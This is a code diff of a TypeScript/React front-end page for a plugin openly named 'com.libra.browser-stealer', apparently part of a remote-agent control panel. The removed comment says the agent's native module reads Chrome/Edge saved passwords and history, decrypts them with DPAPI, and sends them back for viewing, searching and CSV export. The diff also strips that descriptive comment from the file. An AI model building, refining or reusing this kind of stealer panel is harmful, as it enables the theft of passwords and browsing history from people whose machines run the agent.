@@ -5,19 +5,6 @@ import { Accordion, Button, Chip, Dropdown, Input, Label, Skeleton, Tabs, Table,
 import { ArrowDownToLine, ArrowRotateLeft, ChevronDown, Eye, EyeSlash, Globe, Magnifier } from '@gravity-ui/icons';
 import { usePluginHost } from '../../hooks/usePluginHost';
 
-/**
- * 浏览器数据插件页面（page/index.tsx）—— com.libra.browser-stealer。
- *
- * 数据流：
- *   1. dispatchTask('com.libra.browser-stealer', 'collect', { type, offset, limit })
- *      → Agent 端 native 模块（browser_stealer）读取 Chrome/Edge 的
- *      Login Data / History（DPAPI 解密），返回
- *      { total, offset, limit, items: [BrowserPassword|BrowserHistory] }。
- *   2. 搜索：dispatchTask('com.libra.browser-stealer', 'search', { type, keyword })。
- *
- * 保持原「软件数据 → 浏览器」标签页的 UI 与操作不变：
- *   密码/历史 双页签、分页滚动加载、搜索、CSV 导出、密码显隐。
- */
 const PLUGIN_ID = 'com.libra.browser-stealer';
 const PAGE_SIZE = 250;
 
@@ -49,14 +36,13 @@ interface BrowserPagedResult<T> {
   errors?: string[];
 }
 
-/** 插件结果可能是 JSON 字符串（服务端透传）或已是对象，统一解析。 */
 function parseResult<T>(raw: unknown): T | null {
   if (raw && typeof raw === 'object' && !Array.isArray(raw)) return raw as T;
   if (typeof raw === 'string') {
     try {
       const p: unknown = JSON.parse(raw);
       if (p && typeof p === 'object' && !Array.isArray(p)) return p as T;
-    } catch { /* 非 JSON */ }
+    } catch {  }
   }
   return null;
 }
